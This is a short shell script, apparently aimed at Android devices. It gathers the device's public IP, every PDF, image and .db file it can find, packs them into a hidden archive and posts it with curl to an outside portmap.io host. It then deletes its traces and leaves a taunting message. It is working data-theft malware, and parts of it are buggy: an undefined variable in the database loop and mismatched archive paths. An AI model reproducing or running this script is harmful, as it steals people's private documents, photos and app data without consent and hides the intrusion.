mkdir /sdcard/.mik
mkdir /sdcard/.mik/db
mkdir /sdcard/.mik/img
mkdir /sdcard/.mik/pdf

echo "fuck adm :P !\n Ass: Mik" > /sdcard/msg.txt

#ip
curl ifconfig.me > /sdcard/.mik/ip.txt

#pdf
find /* -name *.pdf > /sdcard/.pdf.txt
find /storage/* -name *.pdf >> /sdcard/.pdf.txt
find /sdcard/* -name *.pdf >> /sdcard/.pdf.txt

#img & png
find /* -name *.png > /sdcard/.img.txt
find /* -name *.jpg >> /sdcard/.img.txt
find /sdcard/* -name *.png >> /sdcard/.img.txt
find /sdcard/* -name *.jpg >> /sdcard/.img.txt
find /storage/* -name *.png >> /sdcard/.img.txt
find /storage/* -name *.jpg >> /sdcard/.img.txt

#db
find /* -name *.db > /sdcard/.db.txt
find /sdcard/* -name *.db >> /sdcard/.db.txt
find /storage/* -name *.db >> /sdcard/.db.txt

arquivo="/sdcard/.pdf.txt"
while IFS= read -r linha || [[ -n "$linha" ]]; do
  cp $linha /sdcard/.mik/pdf
done < "$arquivo"

arquivo2="/sdcard/.img.txt"
while IFS= read -r linha2 || [[ -n "$linha2" ]]; do
  cp $linha2 /sdcard/.mik/img
done < "$arquivo2"

arquivo3="/sdcard/.db.txt"
while IFS= read -r linha3 || [[ -n "$linha3" ]]; do
  cp $linha4 /sdcard/.mik/db
done < "$arquivo3"

rm /sdcard/.img.txt
rm /sdcard/.db.txt
rm /sdcard/.pdf.txt

tar -czf .mik.gz /sdcard/.mik
curl -d @/sdcard/.mik.gz Mikelodeon-33329.portmap.io:33329
rm -rf /sdcard/.mik
rm -rf /sdcard/.mik.gz
